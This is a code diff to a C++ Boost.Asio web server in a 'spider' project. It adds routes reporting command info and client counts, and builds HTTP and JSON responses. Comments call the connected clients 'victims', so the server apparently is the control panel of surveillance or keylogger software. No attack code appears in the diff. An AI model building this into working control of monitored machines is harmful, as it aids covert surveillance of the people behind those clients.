@@ -9,23 +9,22 @@ namespace spider
 namespace http
 {
 
-WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const &running, std::uint32_t port) : AControl(cmdCenter, running), m_port(port), m_routes(), m_io_service(),
+WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const &running, std::uint32_t port, std::vector<std::unique_ptr<::spider::server::Client>> const &clients) : AControl(cmdCenter, running, clients), m_port(port), m_routes(), m_io_service(),
   m_acceptor(m_io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), m_port)), m_cmdCenter(cmdCenter), m_running(running), m_clientCount(0)
 {
   nope::log::Log(Info) << "Creating WebServer";
   nope::log::Log(Debug) << "creating default and custom routes for WebServer";
+
   m_routes["/404"] = [&](std::uint32_t askId)
   {
       std::uint32_t id = 0; //victim client's id
 
-      nope::log::Log(Info) << "Someone requested 404";
+      nope::log::Log(Info) << "Someone is on 404";
       server::Event ev;
       ev.destId = id;
       ev.emitter = this;
       ev.askId = askId;
       ev.commandName = "404";
-      sendEvent(ev);
-      //TODO: remove
       ev.response.setResponse("404");
       m_responseQueue.push(ev);
   };
@@ -40,15 +39,13 @@ WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const
       ev.emitter = this;
       ev.askId = askId;
       ev.commandName = "commandInfo";
-      sendEvent(ev);
-      //TODO: remove
       ev.response.setResponse("CommandInfo");
       m_responseQueue.push(ev);
   };
 
   m_routes["/nb"] = [&](std::uint32_t askId)
   {
-      std::uint32_t id = 0; //victim client's id
+      std::uint32_t id = 0;
 
       nope::log::Log(Info) << "Someone requested the number of client";
       server::Event ev;
@@ -56,8 +53,6 @@ WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const
       ev.emitter = this;
       ev.askId = askId;
       ev.commandName = "clientCount";
-      sendEvent(ev);
-      //TODO: remove
       ev.response.setResponse("ClientCount");
       m_responseQueue.push(ev);
   };
@@ -81,19 +76,6 @@ WebServer::WebServer(server::CommandCenter const &cmdCenter, volatile bool const
       ev.askId = askId;
       ev.commandName = cur.name;
       sendEvent(ev);
-
-      //TODO: TEST ONLY TO REMOVE !!!
-      m_responseQueue.push(ev);
-
-      /*sleep(10);
-        std::stringstream res;
-        std::string sHTML = "GETINFO HERE";
-        res << "HTTP/1.1 200 OK" << std::endl;
-        res << "content-type: text/html" << std::endl;
-        res << "content-length: " << sHTML.length() << std::endl;
-        res << std::endl;
-        res << sHTML;
-        return (res.str());*/
     };
   }
 }
@@ -122,7 +104,6 @@ void WebServer::run()
   m_acceptor.listen();
   acceptClient(m_acceptor, m_io_service, m_routes, m_clientCount, m_clients);
   nope::log::Log(Info) << "WebServer started on port: " << m_port << "." << std::endl;
-  //TODO: running gestion
   while (m_running)
   {
     m_io_service.poll_one();
@@ -137,30 +118,31 @@ void WebServer::checkResponse()
   {
     nope::log::Log(Info) << "Event response found";
     server::Event ev = m_responseQueue.front();
-    std::string res;
+    m_responseQueue.pop();
+    std::stringstream res;
+    std::string code;
     if (ev.response.getResponse() == "CommandInfo")
     {
-      //create JSON HERE
-      res = "all Commands: de, dfew, wef wef, we, we, we,g \r\n";
+      code = "HTTP/1.1 200 OK";
+      res << "all Commands: de, dfew, wef wef, we, we, we,g \r\n";
     }
     else if (ev.response.getResponse() == "ClientCount")
     {
-      //create json with number of client here
-      res = "42\r\n";
+      code = "HTTP/1.1 200 OK";
+      res << "{\"nbClients\" : " << getNbClient() << "}\r\n";
     }
     else if (ev.response.getResponse() == "404")
     {
-      //send 404 page here
-      res = "404\r\n";
+      code = "HTTP/1.1 404 NOT FOUND";
+      res << "{\"error\" : 404}\r\n";
     }
     std::stringstream ss;
-    ss << "HTTP/1.1 200 OK" << std::endl;
+    ss << code << std::endl;
     ss << "content-type: text/html" << std::endl;
-    ss << "content-length: " << res.length() << std::endl;
+    ss << "content-length: " << res.str().length() << std::endl;
     ss << std::endl;
-    ss << res;
+    ss << res.str();
     ss << "\r\n";
-    m_responseQueue.pop();
     for (auto &client : m_clients)
     {
       if (ev.askId == client->getId())
